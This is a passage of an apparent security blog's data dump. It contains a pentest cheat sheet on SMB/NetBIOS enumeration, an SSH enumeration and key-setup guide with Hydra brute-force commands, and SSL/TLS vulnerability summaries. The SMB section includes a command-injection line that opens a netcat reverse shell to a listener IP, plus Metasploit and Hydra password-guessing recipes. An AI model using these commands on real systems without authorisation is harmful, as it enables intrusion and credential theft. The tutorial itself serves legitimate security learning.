\n\nDebuted alongside Windows 10 and Windows Server 2016. This version adds AES 128 GCM encryption to the AES 128 CCM encryption introduced in SMB3, as well as a pre-authentication integrity check using the SHA-512 hash. SMB 3.1.1 also requires secure negotiation when connecting to clients that use SMB 2.x or higher. \n\n## Security Flaws Windows  \n\nThere have been numerous security flaws in Microsoft's implementation of the protocol or the components on which it directly relies over the years.\nOther vendors' security flaws stem primarily from a lack of support for newer authentication protocols such as NTLMv2 and Kerberos in favour of NTLMv1, LanMan, or plaintext passwords. Real-time attack tracking reveals that SMB is a primary attack vector for intrusion attempts, such as the Sony Pictures attack in 2014.  \n  \nNetBIOS is effectively becoming a legacy protocol in client-server networks based on post-MS Windows 2000 / NT. NetBIOS was also designed for non-routable local area networks. NetBIOS effectively provides backwards compatibility for network devices that predate DNS compatibility in most post-2000 networks running Windows 2000 or later. NetBIOS's primary role in Client-Server networks (as well as those with networked peripheral hardware that predates DNS compatibility) is to provide name resolution to computers and networked peripherals. Furthermore, it enables the access and sharing of networked hardware, as well as the mapping and browsing of network folders, shares, and shared printers, faxes, and so on. Its primary function is to provide name resolution to a computer and shared folders via a session-layer protocol transported over TCP/IP. As a result, Windows 2000-based Client-Server networks - and later - do not require this insecure method of name resolution, addressing, or navigating network shares. \n  \n## Security Flaws in Samba:  \n\nSome versions of Samba 3.6.3 and lower have serious security flaws that can allow anonymous users to gain root access to a system via an anonymous connection by exploiting an error in Samba's remote procedure call.\n\nBadlock, a critical security flaw in Windows and Samba, was publicly disclosed on April 12, 2016. CVE-2016-2118 mentions Badlock for Samba (SAMR and LSA person-in-the-middle attacks are possible). \n  \n  \n## Null Sessions\n  \n* In Windows 2000 and Windows NT, null sessions are enabled by default.\n* They are also enabled by default in Windows XP and Windows 2003 Server, but they do not support user account enumeration. \n  \n## SMB Programs \n\nsmbcacls - Set or get ACLs on an NT file or directory names  \n```  \n/usr/bin/smbcacls  \n```\n\nsmbclient - ftp-like client to access SMB/CIFS resources on servers    \n```\n/usr/bin/smbclient\n```\n  \nsmbcontrol - send messages to smbd, nmbd or winbindd processes  \n```  \n/usr/bin/smbcontrol  \n```  \n\nsmbcquotas - Set or get QUOTAs of NTFS 5 shares  \n```  \n/usr/bin/smbcquotas  \n```  \n\nsmbget - wget-like utility for download files over SMB  \n```  \n/usr/bin/smbget  \n/usr/bin/smbmap  \n```  \n\nsmbpasswd - The Samba encrypted password file  \nsmbpasswd - change a user's SMB password  \n```\n/usr/bin/smbpasswd  \n```\n  \nsmbspool - send a print file to an SMB printer  \n```  \n/usr/bin/smbspool  \n```  \n\nsmbstatus - report on current Samba connections  \n```  \n/usr/bin/smbstatus  \n```  \n\nsmbtar - smbtar - shell script for backing up SMB/CIFS shares directly to UNIX tape drives  \n```  \n/usr/bin/smbtar  \n```  \n\nsmbtree - A text based smb network browser  \n```  \n/usr/bin/smbtree  \n```  \n\nOthers: \n``` \n/usr/bin/dceoversmb   \n/usr/bin/pth-smbclient  \n/usr/bin/pth-smbget  \n```\n\n## Smbtree\n\nShow smbtree version  \n```\nsmbtree --version  \n```\n\nShow all workgroups  \n```\nsmbtree  \n```\n\n## Nbtscan vs Nbtstat\n\nThe difference between nbtstat and nbtscan in Windows is that nbtscan can work with multiple IP addresses.\n\nTo determine the meaning of each service in the NetBIOS report, visit Microsoft Knowledge Based on NetBIOS Suffixes (16th Character of the NetBIOS Name) at: \n\n* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-brws/0c773bdd-78e2-4d8b-8b3d-b7506849847b\n\n### Nbtscan\n\nnbtscan is an abbreviation for 'NetBIOS over TCP scanner. \n\nThis is a command-line tool that searches for open NetBIOS nameservers on a local or remote TCP/IP network, which is the first step in discovering open shares. It is based on the functionality of the standard Windows tool nbtstat, but instead of just one address, it operates on a range of addresses. \n\n#### Scanning the network\n\nThis scan will return the IP address of the computer(s), the NetBIOS name, the current logged in user, and the mac address of all NetBIOS on the local subnet. \n\n```\nnbtscan 10.11.1.1-254\nnbtscan 110.11.1.0/24\n```\n\n#### Examining one host\n\nOnce we have decided on a host, we can enter just one host for more information. \n```\nnbtscan -hv 10.11.1.5\n```\n\nThe `-h` makes the output services human-readable and the `-v` gives a verbose output.\n\nIf instead you would like to see a dump of the packets you can use the `-d` option but it **can not** be used with the `-v` or `-d`.\n```\nnbtscan -d 10.11.1.5\n```\n\nSometimes you may want to grep the results and so the -s flag can come in handy to put a separator between the fields.\n\nPipe as a separator:\n```\nnbtscan -vh -s \"|\" 10.11.1.0/24\n```\n\nColon as a separator:\n```\nnbtscan -vh -s : 192.168.1.0/24\n```\n\nFinally, we may want to enter the IP addresses of hosts to scan, which we can do as follows. \n```\nnbtscan -f iplist.txt\n```\n\n#### Additional Flags\n\nAs per the man page, the following three flags sometimes can be useful.\n\nBandwidth output throttling. Slow down output so that it uses no more that bandwidth bps. Useful on slow links, so that outgoing queries do not get dropped.\n```\nnbtscan -b 1000 10.11.1.5\n```\n\nUse local port 137 for scans. Win95 boxes respond to this only. You need to be root to use this option on Unix.\n```\nnbtscan -r 10.11.1.0/24\n```\n\nSuppress banners, headers and error messages.\n```\nnbtscan -q 10.11.1.0/24\n```\n\n## Nmblookup\n\nUse this on a single IP address for greater detail following the nbtscan.\n\nDo a node status on <name> as an IP address:\n```\nnmblookup -A <ip address>\n```\n\nTo find the IP address of a computer given its computer name, we can use:\n```\nnmblookup <computer name>\n```\n\nTo find the group the computer belongs to and its MAC address:\n```\nnmblookup -S <computer name>\n```\n\nFor example, lines containing '<00>' in the output of 'nmblookup -S <computer name>' can be interpreted as follows. The one that is not followed by group is the computer name, and the one that is is the workgroup name to which this computer belongs. \n\nTo find IP addresses of all computers in a workgroup, we can use:\n```\nnmblookup <workgroup name>\n```\n\nIf we want computer names along with IP addresses, then we can use:\n```\nnmblookup -S <workgroup name>\n```\n\n### Workgroup Flags\n\n* workgroup `<00>` group - This name is a remnant of the original LAN Manager browse service.\n* workgroup `<1D>` unique - This name identifies the Local Master Browser (LMB, sometimes called simply \"Master Browser\") for a subnet.\n* workgroup `<1E>` -  group A node that is capable of acting as a \"Browser\" registers this group name to listen for election announcements.\n* nt_domain `<1B>` unique Name registered by the Domain Master Browser. Must be registered with the NBNS in order to be of any real use.\n* nt_domain `<1C>` Internet group Registered by all Domain Controllers in the given NT Domain.\n\n## Nmap\n\nNmap scripts for SMB are located at:\n```\nls -l /usr/share/nmap/scripts/smb*\nls -lsa /usr/share/nmap/scripts | grep \"smb\"\nls /usr/share/nmap/scripts | grep \"smb\" | sed \"s/.nse/,/\" | tr -d \"\\n\\r\"\n```\n\nThe below scripts are available to us.\n```\nsmb-brute,smb-enum-domains,smb-enum-groups, smb-enum-processes,smb-enum-sessions,smb-enum-shares,smb-enum-users,\nsmb-flood,smb-ls,smb-mbenum, smb-os-discovery,smb-print-text,smb-psexec, smb-security-mode,smb-server-stats\nsmb-system-info,smbv2-enabled,smb-vuln-conficker,smb-vuln-cve2009-3103,smb-vuln-ms06-025,smb-vuln-ms07-029\nsmb-vuln-ms08-067, smb-vuln-ms10-054,smb-vuln-ms10-061,smb-vuln-regsvc-dos\n```\n\nWe start off by seeing which SMB ports are open (the `--open` switch is used in order to show only open ports).\n```\nnmap -p 139,445 192.168.1.0/24 --open\n```\n\nWe can also do basic SMB Vulnerability Checking.\n```\nnmap -p T:137,139,445,U:137,139,445 --script=vulns --script-args=unsafe=1 192.168.1.111\n```\n\n### Discover network shares with Nmap\n\nAfter a list of shares is found, the script attempts to connect to each of them anonymously, which divides them into \"anonymous\", for shares that the NULL user can connect to, or \"restricted\", for shares that require a user account.\n\n* https://nmap.org/nsedoc/scripts/smb-enum-shares.html\n\nUse the smb-os-discovery.nse script to discover NetBIOS computer name. The reason for this is that a computer named maria-pc, most likely to have a user named maria, so you can use it during brute forcing phase.\n```\nnmap --open -sS -sV --script smb-enum-shares.nse,smb-os-discovery.nse -p445,139 10.11.1.1/24\n```\n\n## Enum4linux\n\nEnum4linux is a wrapper for smbclient, rpcclient, net and nmblookup.\n\n* http://labs.portcullis.co.uk/tools/enum4linux/\n\nVerbose mode, shows the underlying commands being executed by enum4linux and is a great way to learn what the tool is running behind the scenes.\n```\nenum4linux -v <target-ip>\n```\n\nDo Everything, runs all options apart from dictionary based share name guessing. (-U -S -G -P -r -o -n -i). This opion is enabled if you don't provide any other options.\n```\nenum4linux -a <target-ip>\n```\n\nLists usernames, if the server allows it - (RestrictAnonymous = 0).\n```\nenum4linux -U <target-ip>\n```\n\nIf you have managed to obtain credentials, you can pull a full list of users regardless of the ‘RestrictAnonymous’ option.\n```\nenum4linux -u administrator -p password -U <target-ip>\n```\n\nPulls usernames from the default RID range (500-550,1000-1050).\n```\nenum4linux -r <target-ip>\n```\n\nPull usernames using a custom RID range.\n```\nenum4linux -R 600-660 <target-ip>\n```\n\nLists groups. if the server allows it, you can also specify username -u and password -p.\n```\nenum4linux -G <target-ip>\n```\n\nList Windows shares, again you can also specify username -u and password -p\n```\nenum4linux -S <target-ip>\n```\n\nPerform a dictionary attack, if the server does not let you retrieve a share list\n```\nenum4linux -s shares.txt <target-ip>\n```\n\nPulls OS information using smbclient, this can pull the service pack version on some versions of Windows\n```\nenum4linux -o <target-ip>\n```\n\nPull information about printers known to the remove device.\n```\nenum4linux -i <target-ip>  \n```\n\n## Rpcclient\n\nConnect to anonymous SMB\n```\nroot@kali:~# rpcclient -U \"\" 10.20.50.80\n```\n\nEnumerate domain users\n```\nrpcclient $> enumdomusers\nuser:[nobody] rid:[0x1f5]\nuser:[user] rid:[0x3e8]\nuser:[root] rid:[0x3e9]\n```\n\nConvert names to SIDs\n```\nrpcclient $> lookupnames root\nroot S-1-5-21-2814459928-1332494333-2211073762-1001 (User: 1)\n```\n\nConvert SIDs to names\n```\nrpcclient $> lookupsids S-1-5-21-2814459928-1332494333-2211073762-1001\n```\n\nQuery user info\n```\nrpcclient $> queryuser 1001\n```\n\n## Metasploit\n\nBrute Force SMB Login\n```bash\nmsfconsole\nuse auxiliary/scanner/smb/smb_login\nset RHOSTS 192.168.1.5\nset SMBUser administrator\nset PASS_FILE /root/Documents/passwords_list\nset THREADS 10\nrun\n```\n\n### Metasploit Module\n\nThe pipe_auditor scanner will determine which named pipes are available over SMB. This can provide you with some insight into some of the services that are running on the remote system during your information gathering stage.\n\n```\nmsf> use scanner/smb/pipe_auditor\n```\n\n## Smbclient\n\nThe -N switch indicates that we do not have a root password for this connection.\n```\nsmbclient -L 192.168.75.14 -N\n```\n\nThe above might show us the Samba or Windows server version that we can look in exploit DB.\n\nThis allows us to login to shares.\n```\nsmbclient //host/share\n```\n\nMount discovered share\n```\nsmbclient //MOUNT/share -I target -N\n```\n\nList the contents of a share\n```\nsmbclient -L \\\\RALPH -I 10.11.1.31 -N\nsmbclient -L \\\\MAILSLOT\\Browser -I 10.11.1.218 -N  \n```  \n  \n## Mounting SMB Shares (`mount`)\n\nWhen mounting Windows shares, we need to use cifs as the filesystem type. To do this, our first step is to download the cifs-utilities.\n```\napt-get install cifs-utils\n```\n\nAfter that, we can create a directory in which we want to mount our share. For example, we could install it in the /tmp/ or /mnt/ drives. \n```\nmkdir /tmp/myshare\n```\n\nWe can then mount this directly using the following two options. N.B. The difference is that mount.cifs is a wrapper for mount.\n```\nmount -t cifs //10.11.1.31/wwwroot /mnt/myshare\nmount.cifs //10.11.1.31/wwwroot /mnt/myshare\n```\n\nPassing in options\n```\nmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw\n```\n\nTo unmount a particular share, you have two options. You can either \n\na) navigate to the share on your local system and run\n```\numount -A\n```\n\nOr\n\nb) you can run the same command with the path following from any directory\n```\numount -A /tmp/\n```\n\nTo get a shell back from an SMB share.\n```\nlogon \"/=`nc 10.11.0.233 443 -e /bin/bash`\"\n```\n\n## smb4k\n\nTo install\n```\napt-get install smb4k -y\n```\n\nTo Run\n```\nsmb4k\n```\n\n## Smbmap\n\nList all shares\n```\nsmbmap -H 10.11.1.2\n```\nRecursively view all files inside a share named share\n```\nsmbmap -H 10.11.1.2 -r \"share\"\n```\n  \n## Pass The Hash  \n  \nMore To Come :-)"},{"fields":{"slug":"/linux-security-secure-shell-ssh-introduction"},"excerpt":null,"frontmatter":{"date":"27th January 2022 ","title":"Linux Security :- Secure Shell (SSH) Introduction","description":"This article serves as an introduction to the Secure Shell (SSH) protocol for Linux users. When you need to connect to Linux servers remotely, SSH is the most commonly used method. SSH provides a text interface by spawning a remote shell. All commands entered in your local terminal are sent to the remote server and executed there.","tags":"linux, ssh","posttype":"article"},"body":"\n###What is SSH?\n\nSSH, or Secure Shell, is a \"tried and tested\" protocol that has been in use since 1995. The SSH protocol allows remote servers to be controlled and modified securely, even over insecure networks. This is accomplished through a text interface, which accepts input from your local terminal and sends it to the remote server for execution; All the while providing encryption for the communication exchanged.\n\n###SSH enumeration with Linux\n\nObtaining information from running services is used by penetration testers during the enumeration phase of an engagement to gain insight into the target(s) under review. We can ascertain the following from the SSH protocol:\n  \n* SSH package version - You might be able to find the operating system and version.  \n* SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port/service?).  \n* SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it).\n\nLet us look into acquiring this information with our Linux-based machine.\n\n#### Server version\n\nSSH operates on a client-server architecture. In this architecture, the host being accessed acts as an SSH server, while the host connecting the server acts as an SSH client. Both these utilise the SSH protocol with the help of software; The most common of which is the OpenSSH package for Linux-based systems. \n\nTo find out the SSH server software and its version in use, we can use netcat.\n\n```\nnc 10.0.0.1 22\n\nSSH-2.0-OpenSSH_8.4p1 Debian-6\n```\n\n#### Fingerprinting\n\nSSH keys provide access without the need for passwords. They consist of public and private key pairs, which act as means to encrypt and decipher data exchanged. \n\nPublic keys can also be used to verify the identity of the offering party. A hash obtained from the public key, is also known as fingerprint. SSH servers display their fingerprints to users when they first connect to the server, or the public key of the server has changed since the last time a connection was initiated. \n\nTo obtain the fingerprint of a server, you can use the SSH client on Linux.\n\n```\nroot@kali:~# ssh root@10.11.1.71  \n\n\nThe authenticity of host '10.11.1.71 (10.11.1.71)' can't be established.  \nECDSA key fingerprint is SHA256:AibCWx1KvdJmNHd3KVsYksWtveJPdLZAsHMIChsTeHE.  \nAre you sure you want to continue connecting (yes/no)?  \n```\n\n#### SSH Banner\n\nBefore allowing authentication, the SSH server can display a pre-configured message to its users. If an SSH banner is configured, you can see it while fingerprinting the server as described above.\n\n#### Nmap\n\nNmap is a network mapping tool that is an essential part of every penetration tester's arsenal. The installation comes with Nmap Scripting Engine (NSE), which allows users to write and share network enumeration scripts. These scripts are most typically located at /usr/share/nmap on Linux machines.\n\nTo view which SSH scripts are available with your version of nmap, use `ls` . \n\n```\nbash  \nroot@root:~/# ls -ls /usr/share/nmap/scripts/*ssh*\n8 -rw-r--r-- 1 root root 5659 Sep 2 2016 /usr/share/nmap/scripts/ssh2-enum-algos.nse  \n16 -rw-r--r-- 1 root root 15363 Sep 2 2016 /usr/share/nmap/scripts/ssh-hostkey.nse  \n4 -rw-r--r-- 1 root root 1446 Sep 2 2016 /usr/share/nmap/scripts/sshv1.nse`  \n```\n\nThe nmap host key script allows fingerprinting and banner grabbing across the network.\n\n```\nnmap 192.168.1.0/24 -p 22 -sV --script=ssh-hostkey  \n\n[...]\n| ssh-hostkey: Possible duplicate hosts\n| Key 1024 60:ac:4d:51:b1:cd:85:09:12:16:92:76:1d:5d:27:6e (DSA) used by:\n|   192.168.1.1\n|   192.168.1.2\n| Key 2048 2c:22:75:60:4b:c3:3b:18:a2:97:2c:96:7e:28:dc:dd (RSA) used by:\n|   192.168.1.1\n|_  192.168.1.2\n```\n\n#### Hydra\n\nSSH servers can be configured to support password authentication. This means that upon connecting, a username and password are required for the user to log in. Unlike key-based authentication, password authentication exposes the server brute force password attacks.\n\nHydra is a tool for performing brute force attacks on SSH. These attacks can be set to use a word list, a password list, or a host list.\n\nSeveral hosts with a username and a password list:\n\n```\nhydra -L /usr/share/ncrack/default.usr  -P /usr/share/wordlists/rockyou.txt -M hosts.txt ssh\n```\n\nOne host with a password list against a single user (\"root\"):\n\n```\nhydra -l root -P /usr/share/wordlists/rockyou.txt 10.1.1.1 ssh\n```\n\nHydra flags:\n\n```bash  \n-M = (FILE) server list for parallel attacks, one entry per line  \n-e nsr = \"n\" null password, \"s\" try login as pass, \"r\" try pass as login  \n-s = (PORT) if the service is on a different default port, define it here  \n-l or -L = single username login or username from FILE  \n-p or -P = single password login or password from FILE  \n```\n\n#### Word lists  \n\nThe success rate of a brute force attack is only as high as the quality of the word list used. Word lists should be chosen with the basis of information gathered within the enumeration phase. For example, attacking the \"root\" username on a Windows-based SSH server is less likely to grant access than attacking it on a Linux-based SSH server.\n\nMulti-purpose username lists:\n\n```\n/usr/share/ncrack/default.usr  \n\n/usr/share/metasploit-framework/data/wordlists/default_users_for_services_unhash.txt  \n```\n\nThe most 14344392 popular passwords from a breached password database collection:\n\n```\n/usr/share/wordlists/rockyou.txt  \n```\n\n### About SSH keys  \n  \nSSH keys are a more secure way of logging into a server with SSH than a password alone. As we have uncovered earlier, a brute force attack can eventually crack a password; However, it is nearly impossible to decipher SSH keys with brute force alone. \n\nWhen generating a key pair, you will end up with two long strings of characters: a public and a private key. You can put the public key on any server and then unlock it by connecting with a client that has the private key. When the two match, the system unlocks without requiring a password. You can boost security even further by encrypting the private key with a password.\n\n#### How to set up SSH keys \n\n<https://www.digitalocean.com/community/tutorials/how-to-set-up-ssh-keys--2>  \n  \nIn case of key-based authentication, the SSH connection requires two key pairs:\n\n* Your client software compares the server's (host) public key to data encrypted with the host private key. This necessitates having a copy of the server's public key, which you are given at the first connection and which your client stores if you approve of it.\n* The server verifies your authentication data, which is encrypted with your user private key, using a copy of your user public key that it has because you placed it there (or had someone put there for you).\n  \n#### Step One - Create the RSA key pair  \n  \nThe first step is to create the key pair on the client machine (which is likely just your computer):\n  \n```\nssh-keygen -t rsa  \n```\n\n#### Step Two - Store the keys and passphrase  \n  \nOnce you have entered the Gen Key command, you will get a few more questions:  \n  \n```\nEnter file in which to save the key (/home/demo/.ssh/id_rsa):  \n```\n  \nYou can press enter here, saving the file to the user's home (in this case, my example user is called demo). \n\nNext, you will be prompted for a passphrase.\n  \n```\nEnter passphrase (empty for no passphrase):  \n```\n\nIt is entirely up to you whether or not to use a passphrase. Entering a passphrase has advantages: the security of a key, no matter how encrypted, is still dependent on the fact that it is not visible to others. If an unauthorised user obtains a pass-protected private key, they will be unable to log in to the accounts associated with it until they figure out the passphrase, buying the hacked user some time. The only disadvantage of having a passphrase is having to type it in each time you use the key pair.\n  \nThe entire key generation process looks like this:  \n\n```bash  \nssh-keygen -t rsa  \nGenerating public/private rsa key pair.  \nEnter file in which to save the key (/home/demo/.ssh/id_rsa):  \nEnter passphrase (empty for no passphrase):  \nEnter same passphrase again:  \nYour identification has been saved in /home/demo/.ssh/id_rsa.  \nYour public key has been saved in /home/demo/.ssh/id_rsa.pub.  \nThe key fingerprint is:  \n4a:dd:0a:c6:35:4e:3f:ed:27:38:8c:74:44:4d:93:67 demo@a  \nThe key's randomart image is:  \n+--[ RSA 2048]----+  \n| .oo. |  \n| . o.E |  \n| + . o |  \n| . = = . |  \n| = S = . |  \n| o + = + |  \n| . o + o . |  \n| . o |  \n| |  \n+-----------------+  \n  \nThe public key is now located in /home/demo/.ssh/id_rsa.pub The private key (identification) is now located in /home/demo/.ssh/id_rsa  \n```\n\n#### Step Three - Copy the public key  \n\nOnce the key pair has been generated, the public key should be placed on the server that we intend to use.\n  \nUsing the ssh-copy-id command, you can copy the public key into the new machine's authorized_keys file. Replace the example username and IP address below with your own.\n  \n```\nssh-copy-id user@10.1.1.1\n```\n\nAlternatively, you can paste in the keys using SSH:  \n  \n```\ncat ~/.ssh/id_rsa.pub | ssh user@10.1.1.1 \"mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys\"  \n```\n\nNo matter which command you use, you should see something like this:  \n\n```  \nThe authenticity of host '10.1.1.1 (10.1.1.1)' can't be established.  \nRSA key fingerprint is b1:2d:33:67:ce:35:4d:5f:f3:a8:cd:c0:c4:48:86:12.  \nAre you sure you want to continue connecting (yes/no)? yes  \nWarning: Permanently added '10.1.1.1' (RSA) to the list of known hosts.  \nuser@12.34.56.78's password:  \n```\n\nYou can now log in to user@10.1.1.1 without being prompted for a password. However, if you set a password, you will be prompted to enter it at that time (and every time you log in in the future). \n\n#### Optional Step Four -Disable the password for root login  \n  \nOnce you have copied your public key to the server and confirmed that you can log in using just the SSH keys, you can restrict root login to SSH keys only.\n\nTo do this, open the SSH configuration file:\n\n```\nsudo nano /etc/ssh/sshd_config  \n```\n\nFind the line that includes PermitRootLogin and change it to ensure that users can only connect using their SSH key:\n\n```\nPermitRootLogin without-password  \n```\n\nPut the changes into action:\n\n```\nreload ssh\n```"},{"fields":{"slug":"/vulnerabilities-in-ssl-and-tls-overview"},"excerpt":"Since January 6th, we have been looking at individual SSL/TLS vulnerabilities. This article will provide an overview of the series and…","frontmatter":{"date":"24th January 2022 ","title":"Vulnerabilities in SSL & TLS :- Overview","description":"Since January 6th, we have been looking at individual SSL/TLS vulnerabilities. This article will provide an overview of the series and provide background information on SSL/TLS for those who are unfamiliar with the subject. If you scroll to the bottom, you will find a handy reference sheet for when you are on the phone with customers.","tags":"ssl, tls","posttype":"article"},"body":"Since January 6th, we have been looking at individual SSL/TLS vulnerabilities. This article will provide an overview of the series and provide background information on SSL/TLS for those who are unfamiliar with the subject. \n\nA timeline of SSL and TLS development:\n\n- SSL 2.0. Released in 1995, this version of SSL is now prohibited by the Internet Engineering Task Force (see RFC-6176).\n- SSL 3.0. Released in 1996, SSL 3.0 is deprecated, but a few browsers still support it (RFC-7568).\n- TLS 1.0. Released in 1999 and deprecated in 2020.\n- TLS 1.1. Released in 2006 and deprecated in 2020.\n- TLS 1.2. Released in 2008 and still has no security issues.\n- TLS 1.3. Released in 2018 and continues to be the main protocol used today without any known vulnerabilities.\n\nIn this article series we will cover:\n\n1. [Heartbleed](https://evilsaint.com/article/vulnerabilities-ssl-tls-heartbleed/) \n2. [SWEET32](https://evilsaint.com/article/vulnerabilities-ssl-tls-sweet32/) \n3. [DROWN](https://evilsaint.com/article/vulnerabilities-ssl-tls-drown/) \n4. [FREAK](https://evilsaint.com/article/vulnerabilities-ssl-tls-freak/) \n5. [logjam](https://evilsaint.com/article/vulnerabilities-ssl-tls-logjam/) \n6. [BEAST](https://evilsaint.com/article/vulnerabilities-ssl-tls-beast/) \n7. [BREACH](https://evilsaint.com/article/vulnerabilities-ssl-tls-breach/) \n8. [RC4 Biases](https://evilsaint.com/article/vulnerabilities-ssl-tls-rc4-byte-biases/) \n9. [CCS injection vulnerability](https://evilsaint.com/article/vulnerabilities-ssl-tls-ccs-injection-vulnerability/) \n10. [POODLE](https://evilsaint.com/article/vulnerabilities-ssl-tls-poodle/) \n11. [POODLE over TLS](https://evilsaint.com/article/vulnerabilities-ssl-tls-poodle-over-tls/) \n12. [Lucky13](https://evilsaint.com/article/vulnerabilities-ssl-tls-lucky13/) \n13. [TLS Renegotiation](https://evilsaint.com/article/vulnerabilities-ssl-tls-tls-renegotiation/) \n\n\n## Quick Guide\n\nRight now, if you have the client on the phone, however...\n\nAttack | CVE | Affects | Mitigation \n:-----:|:-----:|:-----|:-----\nLogjam | CVE-2015-4000 | The TLS protocol 1.2 and earlier when a DHE_EXPORT cipher suite is enabled. | Enforce DH group sizes of 1,024 bits and above\nPOODLE | CVE-2014-3566 | SSL version 3.0 | Disable support for SSL 3.0\nBEAST | CVE-2011-3389  | TLS 1.0 or any version of SSL | Enforce TLS 1.1 and higher\nCRIME | 2012-4929  | TLS compression| Disable TLS compression\nBREACH and TIME | CVE-2013-3587 | HTTP compression | Disable HTTP compression\nLucky 13 | CVE-2013-0169 | TLS protocol 1.1 and 1.2 and the DTLS protocol 1.0 and 1.2 in several vendors products | Disable CBC ciphers if your server implementation is flawed\nRC4 byte biases | CVE-2013-2566  | Connections supporting RC4 | Disable support for RC4 cipher suites\nFREAK | CVE-2015-0204  | Any system willing to negotiate RSA Export Keys.  | Disable support for weak export-grade ciphers\nSWEET32 | CVE-2016–2183 and CVE-2016–6329 | Long term client browser foothold | Do not support or negotiate 3DES cipher-suites. At a minimum, AES should be preferred over 3DES. Limit length of TLS session."},{"fields":{"slug":"/vulnerabilities-in-ssl-and-tls-tls-renegotiation"},"excerpt":"Main Points SSL/TLS client-initiated renegotiation is a feature that allows the client to renegotiate new encryption parameters for an SSL…","frontmatter":{"date":"23rd January 2022 ","title":"Vulnerabilities in SSL & TLS :- TLS  Renegotiation","description":"In this article, we will look at the TLS Renegotiation Vulnerability in the SSL and TLS protocols. This is a plaintext injection attack into previously sent packets. TLS and SSL 3.0 do not correctly associate renegotiation handshakes with existing connections. This allows a person-in-the-middle positioned attacker to insert data into a HTTPS session.","tags":"insecure-tls-renegotiation, ssl, tls","posttype":"article"},"body":"## Main Points\n\n- SSL/TLS client-initiated renegotiation is a feature that allows the client to renegotiate new encryption parameters for an SSL/TLS connection within a single TCP connection.\n- During the SSL/TLS handshake, the server incurs a higher computational cost. An attacker can exploit the higher computational cost of the server by opening an SSL/TLS connection to the server and repeatedly initiating renegotiation. This would cause the server to waste resources that would otherwise be used for the server's normal function. In addition, there is the possibility of a DOS.\n- To exploit this vulnerability, the server must not support secure renegotiation and must allow client-side renegotiation.\n- A TLS session can be renegotiated over an existing secure channel to rekey or perform further authentication. A flaw was discovered in the mechanism, by which an attacker with network access could intercept and hold handshake records from a legitimate client, establish a TLS session itself with a server, send application data, initiate renegotiation, and release the legitimate handshake records. As renegotiation is performed over an existing channel, the server believes the session is one and the same.\n\n## Quick Reference\n\n### TLDR\n\nThis is a plaintext injection attack into previously sent packets. TLS and SSL 3.0 do not correctly associate renegotiation handshakes with existing connections. This allows a person-in-the-middle positioned attacker to insert data into a HTTPS session.\n \n### Name\n\nTLS Renegotiation Vulnerability\n\n### CVE Number\n\nThe TLS protocol, and SSL protocol 3.0 (and possibly earlier)\n\n### Microsoft Vulnerability\n\nMS10-049\n\n### Type of Vulnerability\n\nWithin the protocol. \n\n### Affected\n\nThe TLS protocol, SSL protocol 3.0 and possibly earlier versions of SSL. \n\n### Remediation\n\nAvoid renegotiation, or cryptographically bind original and renegotiation TLS handshakes with the secure renegotiation extension."},{"fields":{"slug":"/vulnerabilities-in-ssl-and-tls-lucky13"},"excerpt":"Main Points The attacker must use a different exploit to become a person-in-the-middle and to inject content into the network traffic…","frontmatter":{"date":"21st January 2022 ","title":"Vulnerabilities in SSL & TLS :- Lucky13","description":"In this article, we will look at CVE-2013-0169, also known as the Lucky 13 vulnerability, which exists within SSL and TLS. The TLS protocols 1.1 and 1.2, as well as the DTLS protocols 1.0 and 1.2, do not properly consider timing side-channel attacks when processing malformed CBC padding, allowing remote attackers to conduct plaintext-recovery.","tags":"lucky13, ssl, tls","posttype":"article"},"body":"## Main Points\n\n- The attacker must use a different exploit to become a person-in-the-middle and to inject content into the network traffic stream for this attack to work.\n- First reported by the Information Security Group at Royal Holloway, University of London.\n- TLS headers contain 13 bytes of data for the secure handshake protocol, which can be exploited.\n- When processing malformed CBC padding, the TLS protocols 1.1 and 1.2, as well as the DTLS protocols 1.0 and 1.2, as used in OpenSSL, OpenJDK, PolarSSL, and other products, do not properly consider timing side-channel attacks on a MAC check requirement, allowing remote attackers to conduct distinguishing attacks and plaintext recovery via statistical analysis of timing data for crafted packets.\n- To have enough data to attack, you need to collect several days' worth of packets and traffic via a person-in-the-middle attack. This is why Lucky 13 is a theoretically possible attack vector.\n\n## Quick Reference\n\n### Description\n\nThe TLS protocols 1.1 and 1.2, as well as the DTLS protocols 1.0 and 1.2, do not properly consider timing side-channel attacks when processing malformed CBC padding, allowing remote attackers to conduct plaintext-recovery.\n\n### Name\n\nLucky13 \n\n### CVE Number\n\nCVE-2013-0169\n\n### Type of Vulnerability\n\nWeakness in SSL and TLS themselves and not in a particular implementation of them.\n\n### Affected\n\nThe TLS protocols 1.1 and 1.2 and the DTLS protocols 1.0 and 1.2, as used in OpenSSL, OpenJDK, PolarSSL, and other products.\n\n### Remediation\n\nAvoid CBC mode cipher-suites (use AEAD cipher-suites).\n\nUse Encrypt-then-MAC TLS extension."},{"fields":{"slug":"/vulnerabilities-in-ssl-and-tls-poodle-over-tls"},"excerpt":"Main Points The attacker must use a different exploit to become a person-in-the-middle and to inject content into the network traffic…","frontmatter":{"date":"20th January 2022 ","title":"Vulnerabilities in SSL & TLS :- POODLE over TLS","description":"In this article, we will look at CVE-2014-8730, also known as the Padding Oracle On Downgraded Legacy Over Transport Layer Security (POODLE over TLS) vulnerability. The vulnerability is caused by a TLS server failing to verify the block cipher padding when used with a cipher suite utilising a block cipher, such as AES and DES. Due to the lack of padding checking, encrypted TLS traffic can be decrypted.","tags":"poodle-over-tls, ssl, tls","posttype":"article"},"body":"## Main Points\n\n- The attacker must use a different exploit to become a person-in-the-middle and to inject content into the network traffic stream for this attack to work.\n- Uses a padding-oracle attack in the CBC padding because of the vulnerable TLS implementation.\n\n## Quick Reference\n\n### Description\n\nThis is the POODLE attack; however, the writing over the CBC padding is possible due to TLS implementation not checking cipher padding. \n\n### Abbreviation\n\nPOODLE over TLS \n\n### Name\n\nPadding Oracle On Downgraded Legacy Over Transport Layer Security\n\n### CVE Number\n\nCVE-2014-8730\n\n### Type of Vulnerability\n\nThe vulnerability is caused by the TLS server failing to verify block cipher padding when used with a cipher suite that utilises a block cipher, such as AES and DES. Due to the lack of padding checking, encrypted TLS traffic can be decrypted.\n\n### Affected\n\nThe SSL profiles components in F5 BIG-IP LTM, APM, and ASM 10.0.0 through 10.2.4 and 11.0.0 through 